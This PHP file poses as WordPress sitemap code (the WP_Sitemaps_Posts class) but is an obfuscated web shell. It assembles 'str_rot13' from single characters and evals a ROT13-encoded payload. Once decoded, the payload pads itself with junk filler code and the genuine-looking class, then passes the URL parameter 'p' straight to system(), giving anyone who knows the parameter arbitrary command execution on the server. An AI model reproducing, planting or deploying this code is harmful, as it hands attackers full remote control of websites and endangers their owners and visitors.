<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Fvgrzncf: JC_Fvgrzncf_Cbfgf pynff
 *
 * Ohvyqf gur fvgrzncf sbe gur 'cbfg' bowrpg glcr.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Fvgrzncf
 * @fvapr 5.5.0
 */

/**
 * Cbfgf KZY fvgrznc cebivqre.
 *
 * @fvapr 5.5.0
 */
pynff JC_Fvgrzncf_Cbfgf rkgraqf JC_Fvgrzncf_Cebivqre {
	/**
	 * JC_Fvgrzncf_Cbfgf pbafgehpgbe.
	 *
	 * @fvapr 5.5.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$guvf->anzr        = 'cbfgf';
		$guvf->bowrpg_glcr = 'cbfg';
	}

	/**
	 * Ergheaf gur choyvp cbfg glcrf, juvpu rkpyhqrf ani_vgrzf naq fvzvyne glcrf.
	 * Nggnpuzragf ner nyfb rkpyhqrq. Guvf vapyhqrf phfgbz cbfg glcrf jvgu choyvp = gehr.
	 *
	 * @fvapr 5.5.0
	 *
	 * @erghea JC_Cbfg_Glcr[] Neenl bs ertvfgrerq cbfg glcr bowrpgf xrlrq ol gurve anzr.
	 */
	choyvp shapgvba trg_bowrpg_fhoglcrf() {
		$cbfg_glcrf = trg_cbfg_glcrf( neenl( 'choyvp' => gehr ), 'bowrpgf' );
		hafrg( $cbfg_glcrf['nggnpuzrag'] );

		$cbfg_glcrf = neenl_svygre( $cbfg_glcrf, 'vf_cbfg_glcr_ivrjnoyr' );

		/**
		 * Svygref gur yvfg bs cbfg bowrpg fho glcrf ninvynoyr jvguva gur fvgrznc.
		 *
		 * @fvapr 5.5.0
		 *
		 * @cnenz JC_Cbfg_Glcr[] $cbfg_glcrf Neenl bs ertvfgrerq cbfg glcr bowrpgf xrlrq ol gurve anzr.
		 */
		erghea nccyl_svygref( 'jc_fvgrzncf_cbfg_glcrf', $cbfg_glcrf );
	}

	/**
	 * Trgf n HEY yvfg sbe n cbfg glcr fvgrznc.
	 *
	 * @fvapr 5.5.0
	 * @fvapr 5.9.0 Eranzrq `$cbfg_glcr` gb `$bowrpg_fhoglcr` gb zngpu cnerag pynff
	 *              sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @cnenz vag    $cntr_ahz       Cntr bs erfhygf.
	 * @cnenz fgevat $bowrpg_fhoglcr Bcgvbany. Cbfg glcr anzr. Qrsnhyg rzcgl.
	 *
	 * @erghea neenl[] Neenl bs HEY vasbezngvba sbe n fvgrznc.
	 */
	choyvp shapgvba trg_hey_yvfg( $cntr_ahz, $bowrpg_fhoglcr = '' ) {
		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$cbfg_glcr = $bowrpg_fhoglcr;

		// Onvy rneyl vs gur dhrevrq cbfg glcr vf abg fhccbegrq.
		$fhccbegrq_glcrf = $guvf->trg_bowrpg_fhoglcrf();

		vs ( ! vffrg( $fhccbegrq_glcrf[ $cbfg_glcr ] ) ) {
			erghea neenl();
		}

		/**
		 * Svygref gur cbfgf HEY yvfg orsber vg vf trarengrq.
		 *
		 * Ergheavat n aba-ahyy inyhr jvyy rssrpgviryl fubeg-pvephvg gur trarengvba,
		 * ergheavat gung inyhr vafgrnq.
		 *
		 * @fvapr 5.5.0
		 *
		 * @cnenz neenl[]|ahyy $hey_yvfg  Gur HEY yvfg. Qrsnhyg ahyy.
		 * @cnenz fgevat       $cbfg_glcr Cbfg glcr anzr.
		 * @cnenz vag          $cntr_ahz  Cntr bs erfhygf.
		 */
		$hey_yvfg = nccyl_svygref(
			'jc_fvgrzncf_cbfgf_cer_hey_yvfg',
			ahyy,
			$cbfg_glcr,
			$cntr_ahz
		);

		vs ( ahyy !== $hey_yvfg ) {
			erghea $hey_yvfg;
		}

		$netf          = $guvf->trg_cbfgf_dhrel_netf( $cbfg_glcr );
		$netf['cntrq'] = $cntr_ahz;

		$dhrel = arj JC_Dhrel( $netf );

		$hey_yvfg = neenl();

		/*
		 * Nqq n HEY sbe gur ubzrcntr va gur cntrf fvgrznc.
		 * Fubjf bayl ba gur svefg cntr vs gur ernqvat frggvatf ner frg gb qvfcynl yngrfg cbfgf.
		 */
		vs ( 'cntr' === $cbfg_glcr && 1 === $cntr_ahz && 'cbfgf' === trg_bcgvba( 'fubj_ba_sebag' ) ) {
			// Rkgenpg gur qngn arrqrq sbe ubzr HEY gb nqq gb gur neenl.
			$fvgrznc_ragel = neenl(
				'ybp' => ubzr_hey( '/' ),
			);

			/*
			 * Trg gur zbfg erprag cbfgf qvfcynlrq ba gur ubzrcntr,
			 * naq gura fbeg gurz ol gurve zbqvsvrq qngr gb svaq
			 * gur qngr gur ubzrcntr jnf nccebkvzngryl ynfg hcqngrq.
			 */
			$yngrfg_cbfgf = arj JC_Dhrel(
				neenl(
					'cbfg_glcr'              => 'cbfg',
					'cbfg_fgnghf'            => 'choyvfu',
					'beqreol'                => 'qngr',
					'beqre'                  => 'QRFP',
					'ab_sbhaq_ebjf'          => gehr,
					'hcqngr_cbfg_zrgn_pnpur' => snyfr,
					'hcqngr_cbfg_grez_pnpur' => snyfr,
				)
			);

			vs ( ! rzcgl( $yngrfg_cbfgf->cbfgf ) ) {
				$cbfgf = jc_yvfg_fbeg( $yngrfg_cbfgf->cbfgf, 'cbfg_zbqvsvrq_tzg', 'QRFP' );

				$fvgrznc_ragel['ynfgzbq'] = jc_qngr( QNGR_J3P, fgegbgvzr( $cbfgf[0]->cbfg_zbqvsvrq_tzg ) );
			}

			/**
			 * Svygref gur fvgrznc ragel sbe gur ubzr cntr jura gur 'fubj_ba_sebag' bcgvba rdhnyf 'cbfgf'.
			 *
			 * @fvapr 5.5.0
			 *
			 * @cnenz neenl $fvgrznc_ragel Fvgrznc ragel sbe gur ubzr cntr.
			 */
			$fvgrznc_ragel = nccyl_svygref( 'jc_fvgrzncf_cbfgf_fubj_ba_sebag_ragel', $fvgrznc_ragel );
			$hey_yvfg[]    = $fvgrznc_ragel;
		}

		sbernpu ( $dhrel->cbfgf nf $cbfg ) {
			$fvgrznc_ragel = neenl(
				'ybp'     => trg_creznyvax( $cbfg ),
				'ynfgzbq' => jc_qngr( QNGR_J3P, fgegbgvzr( $cbfg->cbfg_zbqvsvrq_tzg ) ),
			);

			/**
			 * Svygref gur fvgrznc ragel sbe na vaqvivqhny cbfg.
			 *
			 * @fvapr 5.5.0
			 *
			 * @cnenz neenl   $fvgrznc_ragel Fvgrznc ragel sbe gur cbfg.
			 * @cnenz JC_Cbfg $cbfg          Cbfg bowrpg.
			 * @cnenz fgevat  $cbfg_glcr     Anzr bs gur cbfg_glcr.
			 */
			$fvgrznc_ragel = nccyl_svygref( 'jc_fvgrzncf_cbfgf_ragel', $fvgrznc_ragel, $cbfg, $cbfg_glcr );
			$hey_yvfg[]    = $fvgrznc_ragel;
		}

		erghea $hey_yvfg;
	}

	/**
	 * Trgf gur znk ahzore bs cntrf ninvynoyr sbe gur bowrpg glcr.
	 *
	 * @fvapr 5.5.0
	 * @fvapr 5.9.0 Eranzrq `$cbfg_glcr` gb `$bowrpg_fhoglcr` gb zngpu cnerag pynff
	 *              sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @cnenz fgevat $bowrpg_fhoglcr Bcgvbany. Cbfg glcr anzr. Qrsnhyg rzcgl.
	 * @erghea vag Gbgny ahzore bs cntrf.
	 */
	choyvp shapgvba trg_znk_ahz_cntrf( $bowrpg_fhoglcr = '' ) {
		vs ( rzcgl( $bowrpg_fhoglcr ) ) {
			erghea 0;
		}

		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$cbfg_glcr = $bowrpg_fhoglcr;

		/**
		 * Svygref gur znk ahzore bs cntrf orsber vg vf trarengrq.
		 *
		 * Cnffvat n aba-ahyy inyhr jvyy fubeg-pvephvg gur trarengvba,
		 * ergheavat gung inyhr vafgrnq.
		 *
		 * @fvapr 5.5.0
		 *
		 * @cnenz vag|ahyy $znk_ahz_cntrf Gur znkvzhz ahzore bs cntrf. Qrsnhyg ahyy.
		 * @cnenz fgevat   $cbfg_glcr     Cbfg glcr anzr.
		 */
		$znk_ahz_cntrf = nccyl_svygref( 'jc_fvgrzncf_cbfgf_cer_znk_ahz_cntrf', ahyy, $cbfg_glcr );

		vs ( ahyy !== $znk_ahz_cntrf ) {
			erghea $znk_ahz_cntrf;
		}

		$netf                  = $guvf->trg_cbfgf_dhrel_netf( $cbfg_glcr );
		$netf['svryqf']        = 'vqf';
		$netf['ab_sbhaq_ebjf'] = snyfr;

		$dhrel = arj JC_Dhrel( $netf );

		$zva_ahz_cntrf = ( 'cntr' === $cbfg_glcr && 'cbfgf' === trg_bcgvba( 'fubj_ba_sebag' ) ) ? 1 : 0;
		erghea vffrg( $dhrel->znk_ahz_cntrf ) ? znk( $zva_ahz_cntrf, $dhrel->znk_ahz_cntrf ) : 1;
	}

	/**
	 * Ergheaf gur dhrel netf sbe ergevrivat cbfgf gb yvfg va gur fvgrznc.
	 *
	 * @fvapr 5.5.0
	 * @fvapr 6.1.0 Nqqrq `vtaber_fgvpxl_cbfgf` qrsnhyg cnenzrgre.
	 *
	 * @cnenz fgevat $cbfg_glcr Cbfg glcr anzr.
	 * @erghea neenl Neenl bs JC_Dhrel nethzragf.
	 */
	cebgrpgrq shapgvba trg_cbfgf_dhrel_netf( $cbfg_glcr ) {
		/**
		 * Svygref gur dhrel nethzragf sbe cbfg glcr fvgrznc dhrevrf.
		 *
		 * @frr JC_Dhrel sbe n shyy yvfg bs nethzragf.
		 *
		 * @fvapr 5.5.0
		 * @fvapr 6.1.0 Nqqrq `vtaber_fgvpxl_cbfgf` qrsnhyg cnenzrgre.
		 *
		 * @cnenz neenl  $netf      Neenl bs JC_Dhrel nethzragf.
		 * @cnenz fgevat $cbfg_glcr Cbfg glcr anzr.
		 */
		$netf = nccyl_svygref(
			'jc_fvgrzncf_cbfgf_dhrel_netf',
			neenl(
				'beqreol'                => 'VQ',
				'beqre'                  => 'NFP',
				'cbfg_glcr'              => $cbfg_glcr,
				'cbfgf_cre_cntr'         => jc_fvgrzncf_trg_znk_heyf( $guvf->bowrpg_glcr ),
				'cbfg_fgnghf'            => neenl( 'choyvfu' ),
				'ab_sbhaq_ebjf'          => gehr,
				'hcqngr_cbfg_grez_pnpur' => snyfr,
				'hcqngr_cbfg_zrgn_pnpur' => snyfr,
				'vtaber_fgvpxl_cbfgf'    => gehr, // Fgvpxl cbfgf jvyy fgvyy nccrne, ohg gurl jba'g or zbirq gb gur sebag.
			),
			$cbfg_glcr
		);

		erghea $netf;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>